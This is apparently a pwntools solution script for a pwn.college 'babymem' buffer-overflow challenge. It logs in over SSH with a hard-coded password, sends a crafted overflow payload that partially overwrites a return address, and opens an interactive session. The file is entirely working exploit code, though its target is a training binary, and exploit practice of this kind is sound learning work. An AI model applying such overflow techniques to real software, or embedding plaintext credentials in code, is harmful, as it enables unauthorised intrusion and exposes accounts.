from pwn import *
s = ssh(user="ssu-csec",host="ssu-csec.pwn.college",port=22,password="djaxod12",keyfile="../../csec")

context.log_level = 'debug'
p = s.process("./babymem_level9_testing1")
# p = process('./babymem_level9_testing1')

p.sendlineafter(b'Payload size: ',b'58')
pay = b'A'*24+b'B'*4+p8(8*7-1)
# pay = pay.ljust(0x78,b'B')
# pay += p16(0x45E0)
# pause()
p.sendafter(b'bytes)!\n',pay)
p.send(p16(0x71A6))
p.interactive()